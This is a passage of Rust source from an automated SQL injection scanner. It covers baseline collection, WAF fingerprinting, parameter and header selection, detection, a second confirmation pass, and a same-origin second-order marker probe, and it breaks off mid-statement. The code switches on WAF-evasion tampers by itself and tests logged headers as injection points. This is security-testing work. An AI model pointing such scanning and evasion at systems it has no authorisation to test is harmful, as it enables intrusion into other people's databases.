        if let Some(mut raw) = cli_raw_request {
            if let Some(m) = self.config.net.method_override.as_deref() {
                let m = m.trim();
                if !m.is_empty() {
                    raw.method = m.to_ascii_uppercase();
                }
            }
            if self.config.post_data.is_some() {
                warn!("--raw-file and --data both set — raw request wins, --data ignored");
            }
            return Some(raw);
        }
        if let Some(data) = self.config.post_data.as_deref() {
            let raw = synthetic_raw_from_data(data);
            if raw.is_none() && !data.is_empty() {
                warn!("--data is blank — scanning without a body");
            }
            if let Some(mut raw) = raw {
                if let Some(m) = self.config.net.method_override.as_deref() {
                    let m = m.trim();
                    if !m.is_empty() {
                        raw.method = m.to_ascii_uppercase();
                    }
                }
                return Some(raw);
            }
        }
        // Bare `--method` (e.g. `--method POST --target <url>`): method carrier.
        if let Some(m) = self.config.net.method_override.as_deref() {
            let m = m.trim().to_ascii_uppercase();
            if !m.is_empty() {
                return Some(RawRequest {
                    method: m,
                    path: "/".to_owned(),
                    headers: HashMap::new(),
                    body: None,
                    http_version: "HTTP/1.1".to_owned(),
                });
            }
        }
        None
    }

    /// Marker set: `MarkerSet::detect(target)` OR-ed with explicit `--marker`.
    /// Accepts `*`, `§` (or `%c2%a7`), `{{}}` in any combination; unknown
    /// values warn and fall back to detection alone.
    fn effective_marker_set(&self, target_str: &str) -> MarkerSet {
        let mut set = MarkerSet::detect(target_str);
        if let Some(m) = self.config.marker.as_deref() {
            let lower = m.to_ascii_lowercase();
            let mut known = false;
            if m.contains('*') || lower.contains("%2a") {
                set.asterisk = true;
                known = true;
            }
            if m.contains('§') || lower.contains("%c2%a7") {
                set.section = true;
                known = true;
            }
            if m.contains("{{") && m.contains("}}") {
                set.double_brace = true;
                known = true;
            }
            if !known {
                warn!(marker=%m, "unknown --marker, ignoring (expected *, § or {{}})");
            }
        }
        set
    }

    /// Normalized `--dbms` hint as `DbmsKind`, if set and recognized.
    fn dbms_hint_kind(&self) -> Option<crate::dbms::DbmsKind> {
        let hint = self.config.dbms_hint.as_deref()?;
        let v = hint.trim().to_ascii_lowercase();
        match v.as_str() {
            "mysql" | "mariadb" | "my" => Some(crate::dbms::DbmsKind::MySql),
            "postgres" | "postgresql" | "pg" | "pgsql" => Some(crate::dbms::DbmsKind::Postgres),
            "mssql" | "sqlserver" | "sql-server" | "tsql" => Some(crate::dbms::DbmsKind::MsSql),
            "oracle" | "ora" => Some(crate::dbms::DbmsKind::Oracle),
            "sqlite" => Some(crate::dbms::DbmsKind::Sqlite),
            _ => {
                warn!(dbms=%hint, "unknown --dbms hint, ignoring (auto-fingerprint)");
                None
            }
        }
    }

    /// Collects 3 baseline samples, derives the WAF-aware effective tampers/opts.
    /// `Ok(None)` means the run was cancelled with no samples collected — caller
    /// should return [`EngineState::Done`] immediately.
    ///
    /// When a [`crate::recon::BaselineCache`] is attached (recon mode), reuse
    /// the cached entry for `host:port:scheme:raw_hash` instead of re-sending
    /// the 3-sample sequence. WAF-blocking baselines bypass the cache in both
    /// directions (never served, never stored) so a transient block cannot
    /// poison later candidates. Concurrent candidates for the same key
    /// singleflight on a per-key mutex: the first collects, the waiters hit.
    async fn collect_baseline(
        &self,
        target: &TargetUrl,
        raw_request: Option<&RawRequest>,
    ) -> crate::error::Result<Option<(baseline::Baseline, Vec<Tamper>, ProbeOpts)>> {
        let Some(cache) = self.baseline_cache.clone() else {
            return self.collect_baseline_uncached(target, raw_request).await;
        };
        let key = crate::recon::BaselineCache::cache_key(target, raw_request);
        let key_lock = cache.lock_for_key(&key).await;
        let _per_key = key_lock.lock().await;
        if let Some((cached_baseline, cached_tampers, cached_opts)) = cache.get(&key).await
            && !cached_baseline.is_waf_blocking()
        {
            return Ok(Some((cached_baseline, cached_tampers, cached_opts)));
        }
        // Blocking entry (or miss): bypass and re-collect below.
        let collected = self.collect_baseline_uncached(target, raw_request).await?;
        if let Some((fresh_baseline, fresh_tampers, fresh_opts)) = collected.as_ref()
            && !fresh_baseline.is_waf_blocking()
        {
            cache
                .insert(
                    key,
                    (fresh_baseline.clone(), fresh_tampers.clone(), *fresh_opts),
                )
                .await;
        }
        Ok(collected)
    }

    /// Uncached baseline collection: 3 samples + WAF-aware tampers/opts.
    ///
    /// Phase 3: les 3 samples sont émis en concurrent (`join_all` borné à 3,
    /// sans `spawn` unbounded) ; `attempts <= 6` borne les envois, seuls les
    /// ratés sont rejoués. Chaque branche vérifie le `CancellationToken`.
    #[allow(clippy::too_many_lines)]
    async fn collect_baseline_uncached(
        &self,
        target: &TargetUrl,
        raw_request: Option<&RawRequest>,
    ) -> crate::error::Result<Option<(baseline::Baseline, Vec<Tamper>, ProbeOpts)>> {
        // Baseline: 3 requests (hidden when stderr is not a TTY: MCP/CI).
        // `indicatif` draws to stderr only, so stdout JSON-RPC stays clean.
        let pb = spinner("collecting baseline…");
        let phase_started = Instant::now();
        let req_before = self.state.read().await.request_count();

        let mut samples = Vec::new();
        // Retry samples on body-read failure instead of pushing `Vec::new()`:
        // an empty body scores as similarity ~0 / confidence 0.75 (false
        // positive). Transport errors (`Timeout`, stream reset) are retryable
        // and must never enter the baseline.
        //
        // Phase 3: the 3 samples are fetched concurrently (`join_all`, borné
        // à 3, sans `spawn` unbounded) so `3×5s` TTFB coûte ~5-6s au lieu de
        // 16s séquentiels. `attempts <= 6` borne le total d'envois
        // individuels ; seuls les samples ratés sont rejoués au tour suivant.
        // Chaque branche vérifie le `CancellationToken` avant envoi (le
        // `send_with_retry` + `read_body` restent annulables via le token).
        // `rate_limit acquire_cancellable` + jitter restent dans
        // `send_with_retry`, donc partagés et bornés comme avant.
        let mut attempts = 0usize;
        while samples.len() < 3 && attempts < 6 {
            if self.cancel.is_cancelled() {
                break;
            }
            let needed =
                (3usize.saturating_sub(samples.len())).min(6usize.saturating_sub(attempts));
            if needed == 0 {
                break;
            }
            attempts = attempts.saturating_add(needed);
            let futs: Vec<_> = (0..needed)
                .map(|_| async {
                    if self.cancel.is_cancelled() {
                        return BaselineOutcome::Cancelled;
                    }
                    let start = Instant::now();
                    let spec = raw_request.map_or_else(
                        || RequestSpec::get(target.as_str().to_owned()),
                        |raw| request_spec_from_raw(target, raw),
                    );
                    let resp = self.client.send_with_retry(spec, &self.cancel).await;
                    let elapsed = start.elapsed();
                    match resp {
                        Ok(r) => {
                            let status = r.status().as_u16();
                            // Clone headers BEFORE the body read consumes the response.
                            // Values truncated to 128 chars (OPSEC: bounds Set-Cookie
                            // token retention); WAF detection only needs `contains`.
                            let raw_headers: Vec<(String, String)> = r
                                .headers()
                                .iter()
                                .filter_map(|(name, value)| {
                                    value.to_str().ok().map(|raw| {
                                        let mut kept = raw.to_owned();
                                        if kept.len() > crate::detection::waf::HEADER_VALUE_KEEP {
                                            kept.truncate(crate::detection::waf::HEADER_VALUE_KEEP);
                                        }
                                        (name.as_str().to_ascii_lowercase(), kept)
                                    })
                                })
                                .collect();
                            match self.client.read_body_with_timeout(r).await {
                                Ok(body) => BaselineOutcome::Sample(baseline::Sample {
                                    status,
                                    body,
                                    duration: elapsed,
                                    headers: raw_headers,
                                }),
                                Err(_) => BaselineOutcome::BodyReadFailed,
                            }
                        }
                        Err(e) => BaselineOutcome::TransportFailed(format!(
                            "baseline request failed: {e}"
                        )),
                    }
                })
                .collect();
            // Borné à `needed <= 3`, aucun `spawn` (pas de tâche détachée).
            let results = futures::future::join_all(futs).await;
            for outcome in results {
                if self.cancel.is_cancelled() {
                    break;
                }
                match outcome {
                    BaselineOutcome::Sample(s) => {
                        if samples.len() < 3 {
                            samples.push(s);
                            self.state.write().await.increment_requests();
                        }
                    }
                    BaselineOutcome::BodyReadFailed => {
                        warn!("baseline body read failed, retrying sample");
                        self.state.write().await.increment_requests();
                    }
                    BaselineOutcome::Cancelled => {
                        // Sortie propre : ni compté ni warn.
                    }
                    BaselineOutcome::TransportFailed(msg) => {
                        warn!(error=%msg, "baseline request failed");
                        // A request was sent: count it so `--request-budget`
                        // cannot be bypassed by failing baselines.
                        self.state.write().await.increment_requests();
                    }
                }
                if samples.len() >= 3 {
                    break;
                }
            }
        }
        if samples.is_empty() {
            // Clear the spinner line so the log stays clean (`ing` → `ed`
            // is reported via the `warn!`/`Err` below, not a stale bar).
            pb.finish_and_clear();
            if self.cancel.is_cancelled() {
                return Ok(None);
            }
            return Err(crate::error::InjektError::Other(Box::new(
                std::io::Error::other(
                    "baseline failed: no successful responses from target after 3 attempts",
                ),
            )));
        }
        pb.finish_and_clear();
        let mut baseline = baseline::Baseline::new(&samples);
        // CT-mismatch (P0-4): a `--raw-file` API call (`Content-Type:
        // application/json`) answered with HTML/text means a challenge/deny
        // page intercepted the call. Presence-level alone, blocking only
        // with a corroborating status (see `Baseline::apply_ct_mismatch`).
        if let Some(expected_ct) = raw_request.and_then(|r| r.content_type()) {
            baseline.apply_ct_mismatch(&samples, expected_ct);
        }
        {
            let req_done = self.state.read().await.request_count();
            let req_delta = req_done.saturating_sub(req_before);
            // Status codes are logged so a `blocking=true` verdict stays
            // auditable (e.g. one corroborated 403 among 200s explains the
            // WAF warn below without a body dump).
            let statuses: Vec<u16> = baseline.status_codes.clone();
            info!(
                elapsed_s = phase_started.elapsed().as_secs_f64(),
                requests = req_delta,
                statuses = ?statuses,
                "baseline done in {:.1}s, {req_delta} req (statuses: {statuses:?})",
                phase_started.elapsed().as_secs_f64(),
            );
            // Origin erroring behind the CDN (CF 520–524, 5xx): every
            // differential below compares static error pages, so a full
            // detection run is void by construction — say so loudly instead
            // of burning the budget silently. Scan continues (transient
            // blips happen) but the verdict must be read as "unreachable",
            // never as "not injectable".
            if baseline_all_error(&statuses) {
                warn!(
                    statuses = ?statuses,
                    "baseline: all samples server-error (5xx) — origin unreachable, detection differentials will be meaningless"
                );
            }
        }
        // C6 trace: baseline samples as hashes only (never clear body/headers).
        // Guarantees a non-empty RAM-only trace even on clean targets.
        {
            let mut st = self.state.write().await;
            for (idx, sample) in samples.iter().enumerate() {
                let seq = st.next_trace_seq();
                let req_hash = crate::reasoning::trace::hash_str_hex(&format!(
                    "baseline:{idx}:{}",
                    target.as_str()
                ));
                let resp_hash = crate::reasoning::trace::hash_sha256_hex(sample.body.as_slice());
                #[allow(clippy::cast_precision_loss)]
                let ms = sample.duration.as_secs_f64() * 1000.0;
                st.push_trace(crate::reasoning::ProbeRecord::new(
                    seq,
                    "baseline",
                    "baseline",
                    "none",
                    self.config.seed,
                    req_hash,
                    resp_hash,
                    0.0,
                    ms,
                ));
            }
        }
        if baseline.is_waf_blocked() {
            warn!(
                target=%self.scrubber.scrub(target.as_str()),
                "possible WAF detected (repeated 403/406)"
            );
        }
        // Blocking WAF = actionable warn; mere CDN presence (e.g. `cf-ray`
        // on a normal 200, `blocking=false`) = informational `info!` so a
        // `cloudflare` fingerprint doesn't read as an attack blocked.
        if baseline.is_waf_blocking() {
            warn!(
                target=%self.scrubber.scrub(target.as_str()),
                vendor=%baseline.waf_vendor.as_deref().unwrap_or("unknown"),
                hits=%baseline.waf_hits.join(","),
                blocking=true,
                "WAF blocking signals detected (challenge/deny/rate-limit)"
            );
        } else if baseline.is_waf_suspected() {
            info!(
                target=%self.scrubber.scrub(target.as_str()),
                vendor=%baseline.waf_vendor.as_deref().unwrap_or("unknown"),
                hits=%baseline.waf_hits.join(","),
                blocking=false,
                "CDN/WAF fingerprinted (informational, no block)"
            );
        }
        // Effective tampers: only an active WAF block auto-enables a bypass.
        // Mere CDN presence (for example `cf-ray` on a normal 200 response)
        // remains informational and must not alter probe semantics.
        let effective_tampers: Vec<Tamper> = if (baseline.is_waf_blocked()
            || baseline.is_waf_blocking())
            && self.config.evasion.tampers.is_empty()
        {
            info!(
                "WAF suspected and no --tamper given — auto-enabling space2comment,randomcase for detection"
            );
            waf_auto_tampers()
        } else {
            self.config.evasion.tampers.clone()
        };
        if !effective_tampers.is_empty() {
            info!(
                tampers=?effective_tampers.iter().map(super::super::techniques::tamper::Tamper::name).collect::<Vec<_>>(),
                "WAF tampers active"
            );
        }
        let effective_opts = ProbeOpts::new(self.config.evasion.hpp, self.config.evasion.chunked);
        if effective_opts.is_active() {
            info!(hpp=%effective_opts.hpp, chunked=%effective_opts.chunked, "request-level tampers active");
        }
        Ok(Some((baseline, effective_tampers, effective_opts)))
    }

    /// Builds the marker-synthetic + real parameter list to test, applying
    /// `-p` filtering (skipped when a recon `candidate_param` is already fixed).
    ///
    /// Emplacements exotiques (`User-Agent` / `Referer` / `X-Forwarded-For` /
    /// `X-Real-IP`, souvent loggés en base sans sanitisation → second-order
    /// via header) : ajoutés comme synthétiques à partir du `--level 2`
    /// quand absents des params déjà collectés. L1 reste byte-identique
    /// (aucune requête extra par défaut, même philosophie que sqlmap qui ne
    /// teste UA/Referer qu'à haut niveau).
    fn select_params(
        &self,
        target_str: &str,
        target: &TargetUrl,
        raw_request: Option<&RawRequest>,
        candidate_param: Option<&TargetParameter>,
    ) -> (MarkerSet, Vec<TargetParameter>) {
        let marker_set = self.effective_marker_set(target_str);
        let mut params = Vec::new();
        // Marker mode: synthetic params, but also test real query params (don't ignore them)
        if marker_set.asterisk {
            params.push(TargetParameter::new(
                "marker_asterisk",
                ParameterLocation::Query,
                "*",
            ));
        }
        if marker_set.section {
            params.push(TargetParameter::new(
                "marker_section",
                ParameterLocation::Query,
                "§",
            ));
        }
        if marker_set.double_brace {
            params.push(TargetParameter::new(
                "marker_brace",
                ParameterLocation::Query,
                "{{}}",
            ));
        }
        // Always include real query params even when markers present (fixes #6)
        params.extend(crate::target::parameters::collect_from_url_query(target));
        // Body params from --raw-file or --data (synthetic raw)
        if let Some(raw) = raw_request {
            params.extend(crate::target::parameters::collect_from_raw_request(raw));
        }
        // Exotic headers (L2+) : UA/Referer/XFF souvent oubliés, loggés en base.
        if self.config.budget.level >= 2 && candidate_param.is_none() {
            let exotic = crate::target::parameters::synthetic_exotic_headers(&params);
            if !exotic.is_empty() {
                info!(
                    count = exotic.len(),
                    "exotic header params added (level>=2: User-Agent/Referer/X-Forwarded-For)"
                );
                params.extend(exotic);
            }
        }
        let mut to_test: Vec<TargetParameter> = if let Some(param) = candidate_param.cloned() {
            vec![param]
        } else if params.is_empty() {
            vec![TargetParameter::new("id", ParameterLocation::Query, "1")]
        } else {
            params
        };
        // `-p` selection (candidate_param from recon always wins and skips the filter)
        if candidate_param.is_none() && !self.config.test_params.is_empty() {
            let before = to_test.len();
            to_test = filter_params(to_test, &self.config.test_params);
            if to_test.is_empty() {
                warn!(
                    filter=?self.config.test_params,
                    before,
                    "parameter filter matched 0 params — nothing to test"
                );
            } else {
                info!(filter=?self.config.test_params, before, after=%to_test.len(), "parameter filter applied");
            }
        }
        (marker_set, to_test)
    }

    /// Runs boolean/error/time/union/stacked/json/nosql/oob detection for every
    /// candidate parameter with bounded concurrency (respects `--threads`).
    /// Minimal C3 loop: one [`Hypothesis`] per (param, technique) seeded by
    /// `compute_calibrated_prior(context, dbms_belief)`; each
    /// `test_*_bounded` outcome maps to `record_probe/record_trial/
    /// record_waf_penalty`; prune at `posterior <= 0.04`, confirm at
    /// `>= 0.85 + trials_passed > 0`. `Finding` emission is unchanged.
    /// `context_probes` (the `<=8` adaptive probes) seeds every per-parameter
    /// scheduler budget so the global cost stays visible in `budget_spent`
    /// from the first `pop` (the true cross-param total is
    /// `SessionState::request_count`).
    #[allow(clippy::too_many_arguments)]
    async fn run_detection(
        &self,
        target: &TargetUrl,
        target_str: &str,
        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
        effective_tampers: &[Tamper],
        context: &InjectionContext,
        dbms_belief: &DbmsBelief,
        context_probes: usize,
        to_test: Vec<TargetParameter>,
    ) {
        let pb2 = if to_test.len() > 1 {
            Arc::new(progress_bar(to_test.len() as u64))
        } else {
            Arc::new(indicatif::ProgressBar::hidden())
        };
        let concurrency = self.config.budget.threads.clamp(1, 32);
        let detection_started = Instant::now();
        let shared = Arc::new(DetectionShared {
            target: target.clone(),
            target_str: target_str.to_owned(),
            marker_set: marker_set.clone(),
            baseline: baseline.clone(),
            tampers: effective_tampers.to_vec(),
            context: context.clone(),
            dbms_belief: dbms_belief.clone(),
            context_probes,
            started: detection_started,
        });
        let stream = futures::stream::iter(to_test)
            .map(|param| {
                let shared = Arc::clone(&shared);
                let client = self.client.clone();
                let state = Arc::clone(&self.state);
                let cancel = self.cancel.clone();
                let config = self.config.clone();
                let pb2 = Arc::clone(&pb2);
                let raw_request = Arc::clone(raw_request);
                async move {
                    run_detection_for_param(
                        &client,
                        &state,
                        &cancel,
                        &config,
                        &shared,
                        &raw_request,
                        &param,
                    )
                    .await;
                    pb2.inc(1);
                }
            })
            .buffer_unordered(concurrency);

        stream.collect::<Vec<()>>().await;
        // Clear the bar so the `detection done in …` summary logged by the
        // caller stays on a clean line (no `████ 1/1 …` glued to logs).
        // Single global bar (X/Y over blind spinner); hidden when stderr
        // is not a TTY (MCP/CI), where it would only spam + burn CPU.
        pb2.finish_and_clear();
    }

    /// C6 `--confirm` strict second-pass (real, not a `warn!`).
    ///
    /// Re-sonde every *confirmed* finding with fresh payloads + derived seed
    /// (`derive_confirm_seed(base, idx)`), OOB excluded. Documented cost:
    /// ~2x requests worst-case (one confirmation budget per finding on top of
    /// detection). Never creates new findings — only drops those that fail
    /// re-validation, so N1/N2 stay at 0 FP by construction. Inconclusive
    /// outcomes (transport error, `--ignore-code`, cancel) keep the finding
    /// (fail-open toward the first pass, fail-closed toward new FPs).
    ///
    /// C5-tardif extension: after a finding is re-validated (`ok == true`),
    /// the mini-mutation ([`crate::mutation`]) probes ≤4 deterministic
    /// variants (1 request each, `mutation:<famille>` traced, silent failure).
    /// The mutation never runs in first-pass detection, never on unconfirmed
    /// findings, never under WAF blocking, and never when `--no-mutation`
    /// is set.
    #[allow(clippy::too_many_arguments, clippy::too_many_lines)]
    async fn run_confirm_second_pass(
        &self,
        target: &TargetUrl,
        target_str: &str,
        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
        effective_tampers: &[Tamper],
        effective_opts: ProbeOpts,
        context: &InjectionContext,
    ) {
        let snapshot = self.state.read().await.findings().to_vec();
        let candidates: Vec<(usize, Finding)> = snapshot
            .into_iter()
            .enumerate()
            .filter(|(_, f)| f.technique != TechniqueKind::Oob && is_confirmed_finding(f))
            .collect();
        if candidates.is_empty() {
            debug!("--confirm second-pass: no confirmed non-OOB findings, 0 extra requests");
            return;
        }
        info!(
            count = candidates.len(),
            "--confirm second-pass start (OOB excluded)"
        );
        let plan = mutation_plan_label(effective_tampers);
        for (idx, finding) in candidates {
            if self.cancel.is_cancelled() {
                break;
            }
            let derived = crate::reasoning::derive_confirm_seed(self.config.seed, idx);
            let param = param_from_finding(&finding);
            let ok = confirm_finding_second_pass(
                &self.client,
                &self.state,
                &self.cancel,
                target,
                target_str,
                &param,
                &finding,
                marker_set,
                raw_request.as_ref().as_ref(),
                baseline,
                effective_tampers,
                &plan,
                effective_opts,
                &self.config.evasion.payload_opts,
                &self.config.matcher,
                &self.config.net.ignore_codes,
                derived,
                context,
                self.config.budget.level,
            )
            .await;
            if ok {
                info!(
                    param = %finding.parameter,
                    technique = %finding.technique,
                    "--confirm re-validated"
                );
                // Link the finding to its confirm trace (opaque hash ref).
                let trace_ref = {
                    let st = self.state.read().await;
                    st.trace().records_for(&finding.parameter).last().map(|r| {
                        format!(
                            "confirm#{}:{}",
                            r.seq,
                            r.request_hash.chars().take(16).collect::<String>()
                        )
                    })
                };
                if let Some(tref) = trace_ref {
                    let mut st = self.state.write().await;
                    if let Some(f) = st.findings_mut().iter_mut().find(|x| {
                        x.parameter == finding.parameter && x.technique == finding.technique
                    }) {
                        let current = f.evidence.clone();
                        if !current.contains("confirm=second-pass") {
                            f.evidence = format!("{current} confirm=second-pass");
                        }
                        f.evidence_detail.trace_ref = Some(tref);
                    }
                }
                // C5-tardif mini-mutation: confirmed-only, bounded, seeded,
                // traced, silent failure (never drops the finding).
                run_mutation_for_finding(
                    &self.client,
                    &self.state,
                    &self.cancel,
                    target,
                    target_str,
                    &param,
                    &finding,
                    marker_set,
                    raw_request.as_ref().as_ref(),
                    baseline,
                    effective_tampers,
                    effective_opts,
                    &self.config.evasion.payload_opts,
                    &self.config.matcher,
                    context,
                    self.config.no_mutation,
                    derived,
                )
                .await;
            } else {
                warn!(
                    param = %finding.parameter,
                    technique = %finding.technique,
                    "--confirm re-validation failed, dropping finding (was likely FP)"
                );
                let mut st = self.state.write().await;
                st.findings_mut().retain(|x| {
                    !(x.parameter == finding.parameter && x.technique == finding.technique)
                });
            }
        }
        info!("--confirm second-pass done");
    }

    /// Option B second-order actif borné (lab only, même-origine).
    ///
    /// Stocke un marqueur bénin jetable (`u+8hex`, payload `'<marker>'`
    /// style union — jamais de RCE, jamais de stacked exec) sur
    /// ≤`max_stores` params Body/Query/Header, puis revisite `revisit_url`
    /// (1 store + max 2 GET séquentiels par param, `RequestClass::Default`).
    /// Les headers exotiques (`User-Agent`/`X-Forwarded-For`/`Referer`,
    /// souvent loggés en base) suivent le même chemin que Body/Query.
    /// `TechniqueKind::Union` réutilisé (pas de nouveau kind → reporting
    /// inchangé) ; `push_stored()` systématique même sans confirmation
    /// (audit passif) ; trace = hashes seuls (`hash_str_hex`), jamais de
    /// marqueur en clair dans les logs.
    ///
    /// Gates anti-FP : même-origine stricte (schéma/host/port), abort si le
    /// body baseline contient déjà le marqueur, finding seulement si 2/2
    /// revisits en 200 non-ignoré reflètent le marqueur (confidence 0.85,
    /// FP 0.15, evidence `second-order stored marker reflected
    /// confirm=second-pass`).
    ///
    /// # Errors
    /// Retourne `InjektError::Other` si `--second-order-revisit-url` est
    /// absent/vide, si le revisit n'est pas même-origine que la cible, ou si
    /// sa résolution DNS-time échoue (même garde que `run_internal`).
    #[allow(clippy::too_many_arguments, clippy::too_many_lines)]
    async fn run_second_order(
        &self,
        target: &TargetUrl,
        target_str: &str,
        to_test: &[TargetParameter],
        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
    ) -> crate::error::Result<()> {
        if !self.config.second_order.enabled {
            return Ok(());
        }
        let revisit_raw = self
            .config
            .second_order
            .revisit_url
            .clone()
            .unwrap_or_default();
        let revisit_raw = revisit_raw.trim().to_owned();
        if revisit_raw.is_empty() {
            return Err(crate::error::InjektError::Other(Box::new(
                std::io::Error::other(
                    "--second-order requires --second-order-revisit-url (same-origin path, e.g. /admin)",
                ),
            )));
        }
        // Résolution contre le host cible : chemin (`/admin`) → absolu
        // même-origine ; URL absolue → vérifiée même-origine ci-dessous.
        let revisit_absolute = if revisit_raw.contains("://") {
            revisit_raw.clone()
        } else {
            let path = if revisit_raw.starts_with('/') {
                revisit_raw.clone()
            } else {
                format!("/{revisit_raw}")
            };
            let Some(host) = target.inner().host_str() else {
                return Err(crate::error::InjektError::Other(Box::new(
                    std::io::Error::other("second-order: target has no host"),
                )));
            };
            let port_part = target
                .inner()
                .port()
                .map_or_else(String::new, |p| format!(":{p}"));
            format!("{}://{host}{port_part}{path}", target.inner().scheme())
        };
        // Même-origine stricte : schéma + host (insensible à la casse) +
        // port effectif identiques, sinon erreur (pas de SSRF inter-host).
        let revisit_target = TargetUrl::parse(&revisit_absolute, self.config.net.allow_private)
            .map_err(|e| {
                crate::error::InjektError::Other(Box::new(std::io::Error::other(format!(
                    "second-order revisit parse failed: {e}"
                ))))
            })?;
        let same_scheme = revisit_target.inner().scheme() == target.inner().scheme();
        let same_host = revisit_target
            .inner()
            .host_str()
            .zip(target.inner().host_str())
            .is_some_and(|(a, b)| a.eq_ignore_ascii_case(b));
        let same_port = revisit_target.inner().port_or_known_default()
            == target.inner().port_or_known_default();
        if !(same_scheme && same_host && same_port) {
            return Err(crate::error::InjektError::Other(Box::new(
                std::io::Error::other(
                    "second-order revisit must be same-origin as target (scheme/host/port)",
                ),
            )));
        }
        // Même garde DNS-time que `run_internal` : sauf `remote_dns`
        // (`socks5h://`, le proxy résout à distance), on résout localement.
        if !self.config.net.allow_private
            && !self.config.net.remote_dns
            && let Some(host) = revisit_target.inner().host_str()
        {
            TargetUrl::resolve_and_check(host, false)
                .await
                .map_err(|e| crate::error::InjektError::Other(Box::new(e)))?;
        }
        // WAF bloquant : 0 requête extra (même règle que la détection).
        if baseline.is_waf_blocking() {
            warn!(
                target=%self.scrubber.scrub(target_str),
                "second-order skipped (WAF blocking baseline)"
            );
            return Ok(());
        }
        let max_stores = self.config.second_order.max_stores.clamp(1, 32);
        // Body/Query + Header (UA/XFF/Referer souvent loggés en base sans
        // sanitisation → second-order via header). `Cookie` exclu : le jar
        // persistant rejouerait le marqueur sur les revisits et fausserait
        // le 2/2 (auto-réflexion, pas stockage serveur).
        let candidates: Vec<TargetParameter> = to_test
            .iter()
            .filter(|p| {
                matches!(
                    p.location,
                    ParameterLocation::Query
                        | ParameterLocation::Body
                        | ParameterLocation::Header(_)
                )
            })
            .take(max_stores)
            .cloned()
            .collect();
        if candidates.is_empty() {
            debug!("second-order: no Body/Query/Header params to store, 0 extra requests");
            return Ok(());
        }
        info!(
            count = candidates.len(),
            revisit = %self.scrubber.scrub(&revisit_absolute),
            "second-order active start (lab only, same-origin, benign marker)"
        );
        let baseline_body = baseline.representative_body_str();
        let ignore_codes = self.config.net.ignore_codes.clone();
        let store_url_hash = crate::reasoning::trace::hash_str_hex(target.as_str());
        let revisit_hash = crate::reasoning::trace::hash_str_hex(&revisit_absolute);
        for param in &candidates {
            if self.cancel.is_cancelled() {
                break;
            }
            if baseline.is_waf_blocking() {
                break;
            }
            // Marqueur bénin jetable `u+8hex` (même format que les payloads
            // union existants) ; jamais loggé en clair, hashes seuls en trace.
            let hex8: String = uuid::Uuid::new_v4()
                .simple()
                .to_string()
                .chars()
                .take(8)
                .collect();
            let marker_clear = format!("u{hex8}");
            // Gate anti-FP : marqueur déjà présent au baseline → on saute ce
            // param (écho naturel, pas une réflexion stockée).
            if baseline_body.contains(&marker_clear) {
                continue;
            }
            // Audit passif systématique, même si la confirmation échoue.
            {
                let mut st = self.state.write().await;
                st.push_stored(crate::session::state::StoredProbe::new(
                    param.key(),
                    secrecy::SecretString::from(marker_clear.clone()),
                    store_url_hash.clone(),
                ));
            }
            // Store : payload bénin `'<marker>'` style union (pas de RCE,
            // pas de stacked exec), chemin d'injection existant.
            let payload = format!("'{marker_clear}'");
            let store_spec = build_injection_spec_with_raw(
                target,
                target_str,
                param,
                &payload,
                marker_set,
                raw_request.as_ref().as_ref(),
                ProbeOpts::new(false, false),
                &self.config.evasion.payload_opts,
            );
            let start = Instant::now();
            let store_resp = self
                .client
                .send_with_retry_for_class(store_spec, RequestClass::Default, &self.cancel)
                .await;
            let store_ms = start.elapsed().as_secs_f64() * 1000.0;
            self.state.write().await.increment_requests();
            let store_ok = match store_resp {
                Ok(r) => {
                    match self
                        .client
                        .read_body_string_for_class(r, RequestClass::Default)
                        .await
                    {
                        Ok(body) => {
                            let mut st = self.state.write().await;
                            let seq = st.next_trace_seq();
                            st.push_trace(crate::reasoning::ProbeRecord::new(
                                seq,
                                param.key(),
                                "union",
                                "second-order:store",
                                self.config.seed,
                                crate::reasoning::trace::hash_str_hex(&payload),
                                crate::reasoning::trace::hash_str_hex(&body),
                                0.0,
                                store_ms,
                            ));
                            true
                        }
                        Err(e) => {
                            warn!(error=%e, "second-order store body read failed");
                            let mut st = self.state.write().await;
                            let seq = st.next_trace_seq();
                            st.push_trace(crate::reasoning::ProbeRecord::new(
                                seq,
                                param.key(),
                                "union",
                                "second-order:store",
                                self.config.seed,
                                crate::reasoning::trace::hash_str_hex(&payload),
                                crate::reasoning::trace::hash_str_hex(""),
                                0.0,
                                store_ms,
                            ));
                            false
                        }
                    }
                }
                Err(e) => {
                    warn!(error=%e, "second-order store request failed");
                    let mut st = self.state.write().await;
                    let seq = st.next_trace_seq();
                    st.push_trace(crate::reasoning::ProbeRecord::new(
                        seq,
                        param.key(),
                        "union",
                        "second-order:store",
                        self.config.seed,
                        crate::reasoning::trace::hash_str_hex(&payload),
                        crate::reasoning::trace::hash_str_hex(""),
                        0.0,
                        store_ms,
                    ));
                    false
                }
            };
            if !store_ok {
                continue;
            }
            // Revisits : max 2 GET séquentiels, `RequestClass::Default`.
            // Exige 2/2 hits (status 200 + non-ignoré + reflet marqueur).
            let mut hits = 0usize;
            for _ in 0..2 {
                if self.cancel.is_cancelled() {
                    break;
                }
                if baseline.is_waf_blocking() {
                    break;
                }
                let start = Instant::now();
                let resp = self
                    .client
                    .send_with_retry_for_class(
                        RequestSpec::get(revisit_absolute.clone()),
                        RequestClass::Default,
                        &self.cancel,
                    )
                    .await;
                let ms = start.elapsed().as_secs_f64() * 1000.0;
                self.state.write().await.increment_requests();
                match resp {
                    Ok(r) => {
                        let status = r.status().as_u16();
                        match self
                            .client
                            .read_body_string_for_class(r, RequestClass::Default)
                            .await
                        {
                            Ok(body) => {
                                let hit = status == 200
                                    && !is_ignored(status, &ignore_codes)
                                    && body.contains(&marker_clear);
                                if hit {
                                    hits += 1;
                                }
                                let mut st = self.state.write().await;
                                let seq = st.next_trace_seq();
                                st.push_trace(crate::reasoning::ProbeRecord::new(
                                    seq,
                                    param.key(),
                                    "union",
                                    "second-order:revisit",
                                    self.config.seed,
                                    crate::reasoning::trace::hash_str_hex(&revisit_absolute),
                                    crate::reasoning::trace::hash_str_hex(&body),
                                    f64::from(u8::from(hit)),
                                    ms,
                                ));
                            }
                            Err(e) => {
                                warn!(error=%e, "second-order revisit body read failed");
                            }
                        }
                    }
                    Err(e) => {
                        warn!(error=%e, "second-order revisit request failed");
                    }
                }
            }
            if hits >= 2 {
                let evidence = format!(
